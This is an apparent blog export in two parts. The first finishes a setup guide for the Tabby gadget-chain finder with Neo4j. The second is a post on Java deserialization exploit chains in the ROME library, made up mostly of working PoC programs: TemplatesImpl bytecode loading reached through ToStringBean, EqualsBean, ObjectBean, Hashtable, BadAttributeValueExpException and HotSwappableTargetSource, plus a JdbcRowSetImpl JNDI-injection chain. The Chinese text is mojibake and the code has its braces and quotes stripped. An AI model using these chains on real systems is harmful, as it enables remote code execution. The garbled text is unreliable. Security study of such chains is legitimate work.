åœ¨settings.propertiesé‡Œæ·»åŠ ä¸€ä¸ªå­—æ®µï¼Œæ˜¯ä½ æœ¬åœ°çš„tabbyï¼ˆå®é™…ä¸Šé«˜ç‰ˆæœ¬tabbyåœ¨è¿™é‡Œå¡«æ²¡ä»€ä¹ˆç”¨ï¼Œå¯å¡«å¯ä¸å¡«ï¼Œä»–ä¸ä¼šè‡ªåŠ¨ä¸Šä¼ æ•°æ®åº“ï¼‰ åœ¨conf eo4j.confä¸‹ï¼Œä¿®æ”¹ä¸€äº›é…ç½® å–æ¶ˆä¸‹é¢ä»£ç çš„æ³¨é‡Š server.directories.import=import å…è®¸apocæ’ä»¶ï¼Œå°†æ³¨é‡Šçš„è¿™æ¡æ”¹ä¸ºä¸‹é¢è¿™æ¡ dbms.security.procedures.unrestricted=jwt.security.*,apoc.* ä¸‹é¢å‡ ä¸ªå†…å­˜åˆ†é…å­—æ®µè‡ªå·±çœ‹ç€æ”¹ä¸€æ”¹ï¼Œå’Œtabbyæ–‡æ¡£æœ‰ç‚¹ä¸åŒçš„æ˜¯è¿™é‡Œæ˜¯server.è€Œä¸æ˜¯tabbyæ–‡æ¡£ä¸­çš„dbms.å¼€å¤´ åœ¨confç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶apoc.confï¼Œå†…å®¹ apoc.import.file.enabled=trueapoc.import.file.use_neo4j_config=false è‡³æ­¤neo4jè¯¥é…ç½®çš„ä¹Ÿé…ç½®å®Œäº†ï¼Œé‡å¯ä¸€ä¸‹çœ‹çœ‹æ•ˆæœ æŸ¥è¯¢è¯­å¥ CALL apoc.help(all) apocæ’ä»¶å¯åŠ¨æ­£å¸¸ æŸ¥è¯¢è¯­å¥ CALL tabby.help(tabby) tabby-path-finderä¾èµ–å¯åŠ¨æ­£å¸¸ å‰©ä¸‹çš„å°±å‚è€ƒå®˜æ–¹æ–‡æ¡£ä¸­ç»™å‡ºçš„ï¼Œå¯¹æ•°æ®åº“åšä¸€äº›å‰æœŸå·¥ä½œäº† æ‰«æç»“æœä¸Šä¼ è‡³neo4jæ•°æ®åº“ï¼ˆç”±äºåç»­çš„è¿‡ç¨‹æˆ‘è‡ªå·±é…å¹¶è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å‡ºäº†æŒºå¤šé—®é¢˜ï¼Œæ‰€ä»¥ç‰ˆæœ¬æ”¹æ¥æ”¹å»çš„ï¼Œç°åœ¨æˆ‘ç”¨çš„tabbyç‰ˆæœ¬ä¸º1.3.2-2ï¼Œç”¨çš„neo4jç‰ˆæœ¬ä¸º5.9.0ï¼‰ å‰é¢æåˆ°è¿‡äº†ï¼Œé«˜ç‰ˆæœ¬çš„tabbyæ˜¯ä¸ä¼šè‡ªåŠ¨å°†ç»“æœä¸Šä¼ åˆ°neo4jï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨å®˜æ–¹ç»™å‡ºçš„å¦ä¸€æ¬¾å·¥å…· tabby-vul-finder ç¬”è€…çš„æ•™è®­æ˜¯ç›´æ¥å°†å…¶å…‹éš†ä¸‹æ¥è€Œä¸æ˜¯ä¸‹å®ƒçš„realeseï¼Œå› ä¸ºå®ƒçš„åˆ†å‘ç‰ˆé‡Œé¢å°‘äº†å¬è¿‡ä¸œè¥¿ï¼Œç”¨çš„æ—¶å€™æ•°æ®ä¸Šä¼ ä¸å…¨ è¯¥å·¥å…·çš„é…ç½®æ–‡ä»¶db.propertiesè¦æŒ‰è‡ªå·±çš„neo4jé…ç½®æ¥è¿›è¡Œæ”¹åŠ¨ æ¥ç€æˆ‘ä»¬å¼€å§‹æµ‹è¯•ï¼Œè¿™æ¬¡æµ‹çš„æ˜¯mavenåº“é‡Œé¢è‡ªå¸¦çš„ccæ¼æ´ç‰ˆæœ¬ setting.propertieså†…å®¹å¦‚ä¸‹ï¼š # need to modifytabby.build.target = C:\\\\Users\\\\BD\\\\.m2\\\\repository\\\\commons-collections\\\\commons-collections\\\\3.2.1\\\\commons-collections-3.2.1.jartabby.build.libraries = libstabby.build.mode = gadgettabby.output.directory = ./output/dev# debugtabby.debug.details = falsetabby.debug.print.current.methods = true# jdk settingstabby.build.useSettingJRE = truetabby.build.isJRE9Module = false#tabby.build.javaHome = /Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Hometabby.build.javaHome = C:\\\\Program Files\\\\Java\\\\jdk1.8.0_65tabby.build.isJDKProcess = truetabby.build.withAllJDK = falsetabby.build.isJDKOnly = false# dealing fatjartabby.build.checkFatJar = true# pointed-to analysistabby.build.isFullCallGraphCreate = falsetabby.build.thread.timeout = 2tabby.build.method.timeout = 5tabby.build.isNeedToCreateIgnoreList = falsetabby.build.timeout.forceStop = falsetabby.build.isNeedToDealNewAddedMethod = true å¯åŠ¨tabbyï¼ˆå‘½ä»¤ä¸­çš„xmxå‚æ•°ä¸æ˜¯å¿…éœ€ï¼Œçœ‹è‡ªå·±è¦æ±‚ï¼‰ java -Xmx8G -jar tabby.jar æˆåŠŸè¿è¡Œçš„è¯ä¼šè¿”å›done bye ç„¶åæˆ‘ä»¬å»çœ‹ouputdevç›®å½•ä¸‹é¢ä¼šç”Ÿæˆå‡ ä¸ªcsvæ–‡ä»¶ æ¥ä¸‹æ¥åˆ©ç”¨tabby-vul-finderå·¥å…·å°†csvæ•°æ®ä¸Šä¼ åˆ°neo4jä¸Š java -jar tabby-vul-finder.jar load E:\\safety\\tools\\tabby\\output\\dev ç„¶ååˆ°https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96ä¸­æ‰¾ä¸€ä¸ªcc2çš„æŒ‡ä»¤æ¥æµ‹è¯•ä¸€ä¸‹ æˆåŠŸæŸ¥å‡ºï¼ï¼ï¼ å†å°½ä¸‰å¤©çš„æŠ˜ç£¨ï¼Œç¬”è€…ç»ˆäºæ˜¯æˆåŠŸç”¨ä¸Šäº† ç®€å•æ”¹ä¸€ä¸‹å®˜æ–¹ç»™å‡ºçš„æ‰¾setter-jndiçš„æŸ¥è¯¢è¯­å¥ match path=(m1:Method)-[:CALL*..5]-(m2:Method IS_SINK:true) where m1.NAME =~ get.* and not m1.HAS_PARAMETERS return path æ³¨æ„ç‚¹ è¿™é—®é¢˜å›°æ‰°é„™äººè®¸ä¹…è®¸ä¹…äº†ï¼Œç»ˆäºæ˜¯åœ¨ä»Šæ—¥æˆåŠŸè§£å†³äº† è¦æ˜¯javaçš„ç‰ˆæœ¬ä¹Ÿå˜äº†ï¼Œé‚£ä¹ˆjre_libsç›®å½•éœ€è¦åˆ æ‰ï¼Œå¦åˆ™æœ¬æ¬¡è¿è¡Œçš„javaç‰ˆæœ¬è¿˜æ˜¯ä¸Šæ¬¡çš„ï¼Œå³ä½¿é…ç½®æ–‡ä»¶æ”¹äº†ä¹Ÿæ²¡æœ‰ç”¨ åœ¨æ¯æ¬¡æ¢äº†targetä¹‹åï¼Œåœ¨è¿è¡Œtabbyä¹‹å‰éœ€è¦å…ˆå°†ä¸Šæ¬¡è¿è¡Œç»“æŸåçš„csvæ–‡ä»¶å…¨éƒ¨åˆ æ‰ï¼Œé¿å…æ±¡æŸ“äº†æœ¬æ¬¡çš„csvæ–‡ä»¶ åœ¨æ¯æ¬¡ç”¨tabby-vul-finderå·¥å…·ä¸Šä¼ æˆ‘ä»¬çš„csvæ–‡ä»¶åˆ°neo4jä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å°†neo4jä¸Šçš„æ•°æ®åº“æ–‡ä»¶å…¨éƒ¨æ¸…é™¤æ‰ï¼Œè™½ç„¶taby-vul-finderå·¥å…·æ˜¯è¯´ä¼šè‡ªåŠ¨æ¸…é™¤æ—§æ•°æ®ï¼Œä½†é„™äººè¿™è¾¹æ˜¯æ²¡æœ‰çš„ã€‚ã€‚ã€‚ åœ¨neo4jä¸Šè‡ªåŠ¨æ¸…é™¤æ‰æ‰€æœ‰æ•°æ®åº“æ–‡ä»¶çš„å‘½ä»¤ï¼š CALL apoc.periodic.commit( MATCH (n) WITH n LIMIT 1000 DETACH DELETE n RETURN count(*), ) æœ€åçš„æœ€åï¼Œneo4jçš„æŸ¥è¯¢è¯­æ³•çœŸå¿ƒä¸éš¾å­¦ï¼Œçœ‹ç€tabbyä½œè€…æä¾›çš„é‚£äº›ä¾‹å­æ¥å­¦å°±è¶³ä»¥äº†ï¼šhttps://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96","categories":["å·¥å…·"]},{"title":"javaååºåˆ—åŒ–ä¹‹Rome","path":"/2025/03/21/javaååºåˆ—åŒ–ä¹‹Rome/","content":"å¼•ç”¨Javaå®‰å…¨å­¦ä¹ â€”â€”ROMEååºåˆ—åŒ– Javaååºåˆ—åŒ–ä¹‹Rome ä»€ä¹ˆæ˜¯ROMEROME æ˜¯ä¸€ä¸ªå¯ä»¥å…¼å®¹å¤šç§æ ¼å¼çš„ feeds è§£æå™¨ï¼Œå¯ä»¥ä»ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œä¹Ÿå¯è¿”å›æŒ‡å®šæ ¼å¼æˆ– Java å¯¹è±¡ã€‚ROME å…¼å®¹äº† RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 ä»¥åŠ Atom 1.0 feeds æ ¼å¼ã€‚ Rome æä¾›äº† ToStringBean è¿™ä¸ªç±»ï¼Œæä¾›æ·±å…¥çš„ toString æ–¹æ³•å¯¹JavaBeanè¿›è¡Œæ“ä½œ ä¾èµ–dependencies dependency groupIdrome/groupId artifactIdrome/artifactId version1.0/version /dependency/dependencies å…¸å‹gadgetæˆ‘ä»¬çœ‹ysoä¸­é“¾å­æ˜¯æ€ä¹ˆå†™çš„ /** * * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMapK,V.hash(Object) * HashMapK,V.readObject(ObjectInputStream) * * @author mbechler * */ è¯¥é“¾æœ€åæ˜¯åˆ©ç”¨getOutputPropertiesæ–¹æ³•è¿›è¡Œä»»æ„ç±»åŠ è½½ æˆ‘ä»¬ä¸€æ­¥æ­¥å¾€å‰çœ‹ï¼Œé¦–å…ˆæ˜¯ToStringBean.toString(String) ç”±å†…å®¹å¯çŸ¥è¯¥æ–¹æ³•ä¼šè°ƒç”¨ä»»æ„çš„getteræ–¹æ³•ï¼Œæ‰€ä»¥TemplatesImplç±»æ­£æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥å®ç°åå°„è°ƒç”¨getOutputProperties()æ–¹æ³•ï¼Œä»è€Œå®ç°äº†ä»»æ„ç±»åŠ è½½ ToStringBeanç±»çš„æ„é€ æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­_beanClassä¸ºJavaBeanç±»å‹çš„classï¼Œ_objä¸ºè¦è°ƒç”¨çš„å¯¹è±¡ï¼Œè¿™é‡Œè¦ä¼ å…¥çš„å½“ç„¶å°±æ˜¯è¦åˆ©ç”¨çš„TemplatesImplç±» toString(String)æ–¹æ³•æ˜¯åœ¨æœ¬ç±»ä¸­çš„toString()æ–¹æ³•ä¸­è¢«è°ƒç”¨ å…¶ä¸­å‚æ•°prefixçš„å€¼å¯¹åç»­çš„åˆ©ç”¨æ²¡æœ‰ä»»ä½•çš„å½±å“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦ç®¡ å¾€ä¸Šèµ°åˆ°EqualsBeanç±»çš„beanHashCode()æ–¹æ³•ï¼Œå®ƒä¼šè°ƒç”¨å‚æ•°_objçš„toStringæ–¹æ³• çœ‹ä¸‹è¯¥ç±»çš„æ„é€ å‡½æ•° public EqualsBean(Class beanClass,Object obj) if (!beanClass.isInstance(obj)) throw new IllegalArgumentException(obj.getClass()+ is not instance of +beanClass); _beanClass = beanClass; _obj = obj; å‘ç°åªè¦æˆ‘ä»¬æŠŠå‚æ•°beanClassèµ‹å€¼ä¸ºToStringBeanç±»ï¼Œobjä¸ºå…¶å¯¹åº”çš„å®ä¾‹å¯¹è±¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è°ƒç”¨å®ƒçš„ToStingæ–¹æ³• åŒæ—¶EqualsBeanç±»ä¸­è¿˜å­˜åœ¨hashCode()æ–¹æ³• é€šè¿‡hashCode()æ–¹æ³•ä¾¿ä¼šè°ƒç”¨beanHashCode()æ–¹æ³• çœ‹åˆ°hashCode()æ–¹æ³•çš„æ—¶å€™å…¥å£ç±»æƒ³å¿…å°±å·²ç»çŸ¥é“æ˜¯å“ªä¸€ä¸ªäº†å§ï¼Œå°±æ˜¯HashMapç±»ï¼Œå…¶keyå€¼è¦ä¸ºEqualsBeanç±»çš„å®ä¾‹å¯¹è±¡ pocå¦‚ä¸‹ï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception TemplatesImpl templatesimpl = new TemplatesImpl(); byte[] bytecodes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); setField(templatesimpl,_name,aaa); setField(templatesimpl,_bytecodes,new byte[][] bytecodes); setField(templatesimpl, _tfactory, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMapObject ,Object hashMap = new HashMap(); hashMap.put(1,1); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,equalsBean); byte[] bytes = ser(hashMap); unser(bytes); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); å…¶ä»–åˆ©ç”¨é“¾ä¸‹é¢å‡ ç§ROMEåˆ©ç”¨é“¾çš„ååŠæ®µè¾ƒä¸ºå›ºå®šï¼Œéƒ½æ˜¯ä½¿ç”¨TemplatesImpl.getOutputProperties()è¿›è¡Œä»»æ„ç±»åŠ è½½ï¼Œæ‰€ä»¥è¿™é‡Œçš„å…¶ä»–åˆ©ç”¨é“¾éƒ½æ˜¯é’ˆå¯¹å‰åŠæ®µå…¥å£å¤„è¿›è¡Œæ›¿æ¢çš„ ObjectBeanå…¶å®è¿™ä¸ªæ‰æ˜¯ysoä¸­çš„åˆ©ç”¨é“¾ åœ¨ObjectBean.hashcode()ä¸­è°ƒç”¨äº†EqualsBean.beanHashCode()ï¼Œå…¶ä½œç”¨å’ŒEqualsBean.hashCode()ç­‰ä»· public ObjectBean(Class beanClass, Object obj) this(beanClass, obj, (Set)null); public ObjectBean(Class beanClass, Object obj, Set ignoreProperties) this._equalsBean = new EqualsBean(beanClass, obj); this._toStringBean = new ToStringBean(beanClass, obj); this._cloneableBean = new CloneableBean(obj, ignoreProperties); ... public int hashCode() return this._equalsBean.beanHashCode(); å¯ä»¥å°†EqualsBean.hashCode()æ›¿æ¢ä¸ºObjectBean.hashcode()ï¼Œåˆ©ç”¨é“¾å¦‚ä¸‹ * TemplatesImpl.getOutputProperties()* ToStringBean.toString(String)* ToStringBean.toString()* EqualsBean.beanHashCode()* ObjectBean.hashcode()* HashMapK,V.hash(Object)* HashMapK,V.readObject(ObjectInputStream) POCå¦‚ä¸‹ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ObjectBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception TemplatesImpl templatesimpl = new TemplatesImpl(); byte[] bytecodes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); setField(templatesimpl,_name,aaa); setField(templatesimpl,_bytecodes,new byte[][] bytecodes); setField(templatesimpl, _tfactory, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl); ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean); HashMapObject ,Object hashMap = new HashMap(); hashMap.put(1,1); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,objectBean); byte[] bytes = ser(hashMap); unser(bytes); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); HashTableHashTableåˆ©ç”¨é“¾å…¶å®å¹¶ä¸æ˜¯é’ˆå¯¹ROMEçš„åˆ©ç”¨é“¾ã€‚å…¶ä½œç”¨æ˜¯æ›¿æ¢ä½œä¸ºååºåˆ—åŒ–å…¥å£çš„HashMapç±»ï¼Œå¦‚æœæ¼æ´è¿‡æ»¤äº†HashMapç±»ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨HashTableç±»è¿›è¡Œæ›¿æ¢ æˆ‘ä»¬çœ‹ä¸€ä¸‹HashTableçš„readObjectæ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•çš„æœ«å°¾æœ‰å¦‚ä¸‹ä»£ç ï¼š å¯çŸ¥å¯¹äºHashTableé‡Œé¢çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½ä¼šè°ƒç”¨reconstitutionPutæ–¹æ³• æˆ‘ä»¬è·Ÿè¿›è¯¥æ–¹æ³• è°ƒç”¨keyçš„hashCode()æ–¹æ³•ï¼Œé‚£å°±å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘ä»¬åªè¦è®©HashTableé‡Œé¢çš„å‚æ•°keyå€¼ä¸ºObjectBeanå¯¹è±¡å°±å¯ä»¥äº† åˆ©ç”¨é“¾å¦‚ä¸‹ * TemplatesImpl.getOutputProperties()* ToStringBean.toString(String)* ToStringBean.toString()* EqualsBean.beanHashCode()* ObjectBean.hashcode()* HashMapK,V.hash(Object)* HashMapK,V.readObject(ObjectInputStream) pocï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ObjectBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Hashtable;public class Main public static void main(String[] args) throws Exception TemplatesImpl templatesimpl = new TemplatesImpl(); byte[] bytecodes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); setField(templatesimpl,_name,aaa); setField(templatesimpl,_bytecodes,new byte[][] bytecodes); setField(templatesimpl, _tfactory, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl); ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean); HashtableObject,Object hashtable = new Hashtable(); hashtable.put(objectBean,1); byte[] bytes = ser(hashtable); unser(bytes); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); BadAttributeValueExpExceptionå…¶å®æèµ·toString()æ–¹æ³•çš„è¯ï¼Œè¿˜æœ‰ä¸€ä¸ªç±»BadAttributeValueExpExceptionä¸å…¶æœ‰å…³ï¼Œåœ¨è¯¥ç±»ä¸­çš„readObject()æ–¹æ³•ä¸­èƒ½å¤Ÿè°ƒç”¨ä»»æ„ç±»çš„toString()æ–¹æ³• public BadAttributeValueExpException (Object val) this.val = val == null ? null : val.toString(); ... private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(val, null); if (valObj == null) val = null; else if (valObj instanceof String) val= valObj; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) val = valObj.toString(); else // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + @ + valObj.getClass().getName(); åœ¨CC5ä¸­ï¼Œæ­£æ˜¯åˆ©ç”¨è¿™ä¸ªç±»æ¥è°ƒç”¨ä»»æ„ç±»çš„toString()æ–¹æ³• ä½†æ˜¯å˜ï¼ŒBadAttributeValueExpExceptionç±»çš„æ„é€ å‡½æ•°é‡Œé¢ä¹Ÿè°ƒç”¨äº†toString()æ–¹æ³• æ‰€ä»¥ä¸ºäº†é¿å…æå‰è§¦å‘ï¼Œæˆ‘ä»¬å°±éœ€è¦é€šè¿‡åå°„æ¥ä¿®æ”¹å‚æ•°valçš„å€¼ åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š * TemplatesImpl.getOutputProperties()* ToStringBean.toString(String)* ToStringBean.toString()* BadAttributeValueExpException.readObject() pocï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.ToStringBean;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Main public static void main(String[] args) throws Exception TemplatesImpl templatesimpl = new TemplatesImpl(); byte[] bytecodes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); setValue(templatesimpl,_name,aaa); setValue(templatesimpl,_bytecodes,new byte[][] bytecodes); setValue(templatesimpl, _tfactory, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123); setValue(badAttributeValueExpException,val,toStringBean); byte[] bytes = ser(badAttributeValueExpException); unser(bytes); public static void setValue(Object obj, String name, Object value) throws Exception Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); HotSwappableTargetSourceè¿™æ¡æ˜¯springåŸç”Ÿçš„toStringåˆ©ç”¨é“¾ï¼Œè°ƒç”¨é“¾å¦‚ä¸‹ * HashMap.readObject* HashMap.putVal* HotSwappableTargetSource.equals* XString.equals* ToStringBean.toString public class ROME_HotSwappableTargetSource public static void main(String[] args) throws Exception TemplatesImpl templatesimpl = new TemplatesImpl(); byte[] bytecodes = Files.readAllBytes(Paths.get(D:\\\\CTF\\\\Security_Learning\\\\ROME\\\\target\\\\classes\\\\shell.class)); setValue(templatesimpl,_name,aaa); setValue(templatesimpl,_bytecodes,new byte[][] bytecodes); setValue(templatesimpl, _tfactory, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templatesimpl); toStringBean.toString(); HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean); HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(xxx)); HashMapObject,Object hashMap = new HashMap(); hashMap.put(h1,h1); hashMap.put(h2,h2); Serial.Serialize(hashMap); Serial.DeSerialize(ser.bin); public static void setValue(Object obj, String name, Object value) throws Exception Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); JdbcRowSetImplJdbcRowSetImplåˆ©ç”¨é“¾æ˜¯é’ˆå¯¹ååŠæ®µTemplatesImpl.getOutputProperties()ä»»æ„ç±»åŠ è½½è¿›è¡Œæ›¿æ¢çš„ã€‚JdbcRowSetImplåˆ©ç”¨é“¾çš„ç»“æœæ˜¯èƒ½é€ æˆJNDIæ³¨å…¥ï¼Œäºæ˜¯ä¸‹é¢å°±å¯ä»¥é…åˆRMIæˆ–è€…LDAPæœåŠ¡è¿›è¡Œæ”»å‡»äº†ã€‚ ç”±äºJDNIæ³¨å…¥ä¸­trustURLCodebaseçš„é™åˆ¶ï¼Œè¿™é‡Œé™åˆ¶çš„æ”»å‡»ç‰ˆæœ¬ä¸º RMIï¼šJDK 6u132ã€JDK 7u122ã€JDK 8u113ä¹‹å‰ LDAPï¼šJDK 7u201ã€8u191ã€6u211ã€JDK 11.0.1ä¹‹å‰ æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ä¸­èƒ½é€ æˆJNDIæ³¨å…¥çš„åŒæ ·æ˜¯JdbcRowSetImplè¿™æ¡é“¾ã€‚é—®é¢˜å‡ºåœ¨JdbcRowSetImpl.getDatabaseMetaData()è¿™ä¸ªgetterä¸Š ï¼ˆæ›´å…·ä½“çš„å…³äºjndiæ³¨å…¥çš„ä¿¡æ¯å¯ä»¥å»ç¿»æˆ‘å‰é¢çš„æ–‡ç« ï¼‰ pocï¼š package org.example;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); String url = ldap://localhost:10389/cn=test,dc=example,dc=com; jdbcRowSet.setDataSourceName(url); ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMapObject,Object hashMap = new HashMap(); hashMap.put(aaa, 123); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,equalsBean); byte[] bytes = ser(hashMap); unser(bytes); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); 